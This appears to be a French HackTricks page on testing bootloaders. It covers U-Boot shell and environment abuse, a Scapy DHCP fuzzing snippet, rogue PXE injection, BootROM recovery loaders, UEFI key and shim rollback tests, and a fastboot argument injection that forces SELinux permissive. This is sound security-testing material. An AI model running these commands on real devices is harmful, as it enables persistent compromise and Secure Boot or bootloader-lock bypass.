# Bootloader Testing

{{#include ../../banners/hacktricks-training.md}}

Les étapes suivantes sont recommandées pour modifier les configurations de démarrage des appareils et tester des bootloaders tels que U-Boot et les loaders de classe UEFI. Concentrez-vous sur l’obtention d’une exécution de code précoce, l’évaluation des protections de signature/rollback et l’exploitation des chemins de recovery ou de network-boot.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins and environment abuse

1. Accéder à l’interpréteur shell
- Pendant le démarrage, appuyez sur une touche d’interruption connue (souvent n’importe quelle touche, 0, espace ou une séquence « magique » spécifique à la carte) avant l’exécution de `bootcmd` pour accéder à l’invite U-Boot.

2. Inspecter l’état du démarrage et les variables
- Commandes utiles :
- `printenv` (exporter l’environnement)
- `bdinfo` (informations sur la carte, adresses mémoire)
- `help bootm; help booti; help bootz` (méthodes de démarrage du kernel supportées)
- `help ext4load; help fatload; help tftpboot` (loaders disponibles)

3. Modifier les arguments du démarrage pour obtenir un root shell
- Ajoutez `init=/bin/sh` afin que le kernel ouvre un shell au lieu de lancer l’init normal :
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Effectuer un netboot depuis votre serveur TFTP
- Configurez le réseau et récupérez une image kernel/fit depuis le LAN :
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persister les modifications via l’environnement
- Si le stockage de l’environnement n’est pas protégé en écriture, vous pouvez persister le contrôle :
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Vérifiez les variables telles que `bootcount`, `bootlimit`, `altbootcmd` et `boot_targets`, qui influencent les chemins de fallback. Des valeurs mal configurées peuvent permettre des interruptions répétées vers le shell.

6. Vérifier les fonctionnalités de debug/non sûres
- Recherchez : `bootdelay` > 0, `autoboot` désactivé, `usb start; fatload usb 0:1 ...` sans restriction, la possibilité d’utiliser `loady`/`loads` via le port série, `env import` depuis un support non fiable et les kernels/ramdisks chargés sans vérification de signature.

7. Tester l’image et la vérification U-Boot
- Si la plateforme annonce un secure/verified boot avec des images FIT, essayez à la fois des images non signées et altérées :
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- L’absence de `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ou un comportement legacy `verify=n` permet souvent de démarrer des payloads arbitraires.
- Ne vous arrêtez pas à un simple résultat allow/deny : des recherches récentes sur FIT ont montré que le chemin de vérification lui-même peut constituer une surface d’attaque pre-auth. Effectuez des tests négatifs sur les données FIT stockées en externe (`data-offset`, `data-position`, `data-size`), la sélection de configurations signées, les `loadables` et la gestion des overlays / `extra-conf`.
- Si vous disposez d’un source tree correspondant, `test/vboot/vboot_test.sh` permet de reproduire rapidement le comportement de la vérification FIT dans le sandbox U-Boot avant d’intervenir sur du hardware réel.

8. Standard Boot (`bootstd`), `extlinux` et bootflows par script
- Dans les builds U-Boot modernes, `bootcmd` n’est souvent qu’un wrapper autour de Standard Boot. Cela signifie que les supports inscriptibles, PXE ou la SPI flash peuvent constituer la véritable trust boundary, même lorsque l’environnement visible semble inoffensif.
- Le `bootmeth` `extlinux` recherche `extlinux/extlinux.conf` sous `/` et `/boot` ; le `bootmeth` script recherche d’abord `boot.scr.uimg`, puis `boot.scr`. Lors d’un network boot, le nom du script peut provenir de `boot_script_dhcp`.
- Commandes de triage utiles :
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- Cas d’abus à tester : support USB/SD contrôlé par l’attaquant placé plus tôt dans `boot_targets`, `/boot/extlinux/extlinux.conf` inscriptible, serveur TFTP rogue fournissant `boot.scr` ou exécution de scripts depuis une SPI via `script_offset_f`.
- Si la plateforme dépend de la vérification FIT, assurez-vous que les configurations sont signées au niveau de la configuration et pas uniquement image par image ; `required-mode=all` est plus robuste que l’acceptation d’une seule clé requise.

## Network-boot surface (DHCP/PXE) and rogue servers

9. Fuzzing des paramètres PXE/DHCP
- La gestion legacy BOOTP/DHCP d’U-Boot a présenté des problèmes de memory-safety. Par exemple, CVE‑2024‑42040 décrit une memory disclosure via des réponses DHCP forgées, pouvant leak des octets de la mémoire U-Boot sur le réseau. Testez les chemins de code DHCP/PXE avec des valeurs excessivement longues ou limites (option 67 bootfile-name, options vendor, champs file/servername) et observez les hangs/leaks.
- Minimal Scapy snippet pour stresser les paramètres de boot pendant un netboot :
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Vérifiez également si les champs de nom de fichier PXE sont transmis à la logique shell/loader sans sanitization lorsqu’ils sont chaînés à des scripts de provisioning côté OS.

10. Tester l’injection de commandes via un serveur DHCP rogue
- Mettez en place un service DHCP/PXE rogue et essayez d’injecter des caractères dans les champs filename ou options afin d’atteindre les command interpreters lors des étapes ultérieures de la boot chain. L’auxiliaire DHCP de Metasploit, `dnsmasq` ou des scripts Scapy personnalisés conviennent bien. Isolez d’abord le réseau de lab.

## SoC ROM recovery modes that override normal boot

De nombreux SoC exposent un mode « loader » BootROM qui accepte du code via USB/UART même lorsque les images flash sont invalides. Si les secure-boot fuses ne sont pas brûlés, cela peut fournir une exécution de code arbitraire très tôt dans la chaîne.

- NXP i.MX (Serial Download Mode)
- Tools : `uuu` (mfgtools3) ou `imx-usb-loader`.
- Exemple : `imx-usb-loader u-boot.imx` pour envoyer et exécuter un U-Boot personnalisé depuis la RAM.
- Allwinner (FEL)
- Tool : `sunxi-fel`.
- Exemple : `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` ou `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool : `rkdeveloptool`.
- Exemple : `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` pour charger un loader et uploader un U-Boot personnalisé.

Évaluez si l’appareil possède des eFuses/OTP secure-boot brûlés. Dans le cas contraire, les modes de téléchargement BootROM contournent fréquemment toute vérification de niveau supérieur (U-Boot, kernel, rootfs) en exécutant directement votre payload de premier niveau depuis la SRAM/DRAM.

## UEFI/PC-class bootloaders: quick checks

11. Tests de tampering de l’ESP, rollback et enrollment de clés
- Montez l’EFI System Partition (ESP) et recherchez les composants du loader : `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, chemins des logos vendor.
- Exportez l’état du Secure Boot et les bases de clés depuis l’OS lorsque cela est possible :
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- Si la plateforme est en Setup Mode, accepte l’enrollment de clés non authentifié ou est livrée avec une Platform Key (PK) de test/par défaut (classe PKfail), un admin local ou un attaquant physique peut enroll sa propre KEK/db et conserver l’apparence d’un Secure Boot « activé » tout en démarrant des binaires EFI arbitraires.
- Essayez de démarrer avec des composants de boot signés downgradés ou connus comme vulnérables si les révocations Secure Boot (dbx) ne sont pas à jour. Si la plateforme fait toujours confiance à d’anciens shims/bootmanagers, vous pouvez souvent charger votre propre kernel ou `grub.cfg` depuis l’ESP afin d’obtenir de la persistence.

12. Tests de révocation des shims obsolètes / SBAT / dbx
- Les anciens shims signés par Microsoft et les forks vendor peuvent encore servir de chemin de bootkit de type BYOVD si les révocations sont obsolètes. Dans un lab isolé, placez un shim historiquement vulnérable sur l’ESP et essayez de chaîner votre propre `grubx64.efi` ou kernel.
- Triage rapide :
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- Si le shim s’exécute toujours malgré sa présence dans la liste de révocation, le firmware/OS dispose de mises à jour `dbx` obsolètes ou fait confiance à un loader forké qui n’a jamais hérité des protections SBAT upstream.

13. Bugs de parsing des boot logos (classe LogoFAIL)
- Plusieurs firmwares OEM/IBV étaient vulnérables à des failles de parsing d’images dans le DXE qui traite les boot logos. Si un attaquant peut placer une image forgée sur l’ESP sous un chemin spécifique au vendor (par exemple `\EFI\<vendor>\logo\*.bmp`) et redémarrer, une exécution de code pendant le boot précoce peut être possible même avec Secure Boot activé. Testez si la plateforme accepte des logos fournis par l’utilisateur et si ces chemins sont inscriptibles depuis l’OS.


## Android/Qualcomm ABL + GBL (Android 16) trust gaps

Sur les appareils Android 16 qui utilisent l’ABL de Qualcomm pour charger la **Generic Bootloader Library (GBL)**, vérifiez si l’ABL **authentifie** l’application UEFI qu’il charge depuis la partition `efisp`. Si l’ABL vérifie uniquement la **présence** d’une application UEFI et ne vérifie pas les signatures, une primitive d’écriture sur `efisp` devient une **exécution de code non signée pre-OS** au démarrage.

Vérifications pratiques et chemins d’abus :

- **efisp write primitive** : vous avez besoin d’un moyen d’écrire une application UEFI personnalisée dans `efisp` (root/service privilégié, bug d’application OEM, chemin recovery/fastboot). Sans cela, le gap de chargement GBL n’est pas directement exploitable.
- **fastboot OEM argument injection** (ABL bug) : certains builds acceptent des tokens supplémentaires dans `fastboot oem set-gpu-preemption` et les ajoutent à la kernel cmdline. Cela peut servir à forcer un SELinux permissive, permettant les écritures sur des partitions protégées :
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Si l’appareil est patché, la commande devrait rejeter les arguments supplémentaires.
- **Bootloader unlock via persistent flags** : un payload de boot-stage peut modifier des flags persistants (par exemple `is_unlocked=1`, `is_unlocked_critical=1`) afin d’émuler `fastboot oem unlock` sans les contrôles d’approbation/serveur OEM. Il s’agit d’un changement de posture durable après le reboot suivant.

Notes défensives/de triage :

- Confirmez si l’ABL effectue une vérification de signature sur le payload GBL/UEFI provenant de `efisp`. Dans le cas contraire, considérez `efisp` comme une surface de persistence à haut risque.
- Vérifiez si les handlers fastboot OEM de l’ABL ont été patchés afin de **valider le nombre d’arguments** et de rejeter les tokens supplémentaires.

## Hardware caution

Soyez prudent lors des interactions avec la SPI/NAND flash pendant le boot précoce (par exemple en mettant des pins à la masse pour contourner les lectures) et consultez toujours la datasheet de la flash. Des courts-circuits mal synchronisés peuvent corrompre l’appareil ou le programmer.

## Notes and additional tips

- Essayez `env export -t ${loadaddr}` et `env import -t ${loadaddr}` pour déplacer des blobs d’environnement entre la RAM et le stockage ; certaines plateformes permettent d’importer un env depuis un support amovible sans authentification.
- Pour la persistence sur les systèmes basés sur Linux qui démarrent via `extlinux.conf`, modifier la ligne `APPEND` (pour injecter `init=/bin/sh` ou `rd.break`) sur la partition de boot suffit souvent lorsqu’aucune vérification de signature n’est appliquée.
- Si la cible utilise des mises à jour dual-slot / A/B, consultez les techniques d’anti-rollback et de slot-desync dans la [firmware analysis overview](README.md) afin de ne pas manquer les trust gaps propres à l’updater et situés en dehors du bootloader lui-même.
- Si le userland fournit `fw_printenv/fw_setenv`, vérifiez que `/etc/fw_env.config` correspond au véritable stockage de l’env. Des offsets mal configurés permettent de lire/écrire la mauvaise région MTD.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [https://kb.cert.org/vuls/id/616257](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
